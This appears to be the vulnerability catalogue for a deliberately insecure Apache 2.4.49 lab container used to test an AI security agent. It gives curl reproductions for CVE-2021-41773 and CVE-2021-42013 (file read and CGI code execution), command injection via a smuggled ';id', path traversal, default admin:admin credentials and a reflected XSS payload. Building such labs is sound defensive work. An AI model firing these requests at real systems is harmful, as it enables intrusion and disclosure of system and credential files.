# Mock Target Lab — Known Vulnerabilities

The `argus-mock-target-lab` container is a **real, intentionally vulnerable**
target. It is based on Apache HTTP Server **2.4.49** and adds deliberately
insecure CGI programs and exposed files. Every item below can be reproduced with
`curl`, and each has a pinned Nuclei template in `templates/` so the ARGUS agent
can independently verify it and attach evidence.

> **Safety:** this container only runs on the isolated `argus-lab` Docker
> network and is bound to `127.0.0.1:8888` on the host. It uses a read-only
> root filesystem, a non-root user, and `cap_drop: ALL`.

Base URL from the host: `http://127.0.0.1:8888`  
Base URL from other containers on `argus-lab`: `http://mock-target-lab:8080`

---

## 1. CVE-2021-41773 — Apache Path Traversal / File Disclosure

- **Severity:** Critical
- **CWE:** CWE-22
- **Where:** `Alias /icons/` combined with `<Directory /> Require all granted`
- **Template:** `cve-2021-41773.yaml`
- **Reproduce:**

```bash
curl --path-as-is "http://127.0.0.1:8888/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

**Expected evidence:** a real `/etc/passwd` containing `root:x:0:0:`.

---

## 2. CVE-2021-42013 — Apache Path Traversal + CGI Remote Code Execution

- **Severity:** Critical
- **CWE:** CWE-22 / CWE-78
- **Where:** `ScriptAlias /cgi-bin/` with `+ExecCGI` and broad `<Directory />`
- **Template:** `cve-2021-42013.yaml`
- **Reproduce:**

```bash
curl --path-as-is -X POST \
  --data-binary 'echo Content-Type: text/plain; echo; id' \
  "http://127.0.0.1:8888/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

**Expected evidence:** `uid=1(daemon) gid=1(daemon)`.

---

## 3. OS Command Injection — `/cgi-bin/ping.sh`

- **Severity:** Critical
- **CWE:** CWE-78
- **Where:** `host` query parameter passed to `eval`
- **Template:** `lab-command-injection-ping.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/cgi-bin/ping.sh?host=127.0.0.1;id"
```

**Expected evidence:** `uid=... gid=...` in the response body.

---

## 4. Path Traversal / Arbitrary File Read — `/cgi-bin/download.sh`

- **Severity:** High
- **CWE:** CWE-22
- **Where:** `file` query parameter concatenated to the document root
- **Template:** `lab-path-traversal-download.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/cgi-bin/download.sh?file=../../../../etc/passwd"
```

**Expected evidence:** real `/etc/passwd` content.

---

## 5. Exposed `.env` with Secrets

- **Severity:** High
- **CWE:** CWE-200 / CWE-538
- **Where:** `/.env` served from the web root
- **Template:** `lab-exposed-env.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/.env"
```

**Expected evidence:** `DB_PASSWORD=`, `AWS_ACCESS_KEY_ID=`, `JWT_SECRET=`
(synthetic values only).

---

## 6. Exposed `.git/config`

- **Severity:** Medium
- **CWE:** CWE-538
- **Where:** `/.git/config` served from the web root
- **Template:** `lab-exposed-git-config.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/.git/config"
```

**Expected evidence:** `[core]` and a `remote "origin"` URL containing a token.

---

## 7. Public Apache `server-status`

- **Severity:** Medium
- **CWE:** CWE-200
- **Where:** `mod_status` enabled at `/server-status` without authentication
- **Template:** `lab-apache-server-status.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/server-status"
```

**Expected evidence:** `Apache Server Status` and live request details.

---

## 8. Directory Listing — `/backup/`

- **Severity:** Medium
- **CWE:** CWE-548
- **Where:** `Options Indexes` on `/backup/`
- **Template:** `lab-directory-listing.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/backup/"
```

**Expected evidence:** `Index of /backup` listing `db.sql`.

---

## 9. Default Admin Credentials — `admin:admin`

- **Severity:** High
- **CWE:** CWE-1392
- **Where:** HTTP Basic auth on `/admin/`
- **Template:** `lab-default-admin-credentials.yaml`
- **Reproduce:**

```bash
curl -u admin:admin "http://127.0.0.1:8888/admin/"
```

**Expected evidence:** HTTP 200 and the administration console
(unauthenticated requests return HTTP 401).

---

## 10. Reflected XSS — `/cgi-bin/greet.sh`

- **Severity:** Medium
- **CWE:** CWE-79
- **Where:** `name` query parameter reflected without encoding
- **Template:** `lab-reflected-xss.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/cgi-bin/greet.sh?name=%3Cscript%3Ealert(1)%3C/script%3E"
```

**Expected evidence:** the `<script>alert(1)</script>` payload is reflected
verbatim.

---

## 11. CGI Environment Disclosure — `/cgi-bin/info.sh`

- **Severity:** Medium
- **CWE:** CWE-200
- **Where:** full CGI environment printed to unauthenticated users
- **Template:** `lab-cgi-env-disclosure.yaml`
- **Reproduce:**

```bash
curl "http://127.0.0.1:8888/cgi-bin/info.sh"
```

**Expected evidence:** `REMOTE_ADDR=` and other CGI variables, plus `uname -a`.

---

## 12. Missing HTTP Security Headers

- **Severity:** Low
- **CWE:** CWE-693
- **Where:** no `Content-Security-Policy` or `X-Frame-Options`
- **Template:** `lab-missing-security-headers.yaml`
- **Reproduce:**

```bash
curl -sD - -o /dev/null "http://127.0.0.1:8888/" | grep -iE "content-security-policy|x-frame-options"
```

**Expected evidence:** no matching headers are returned.
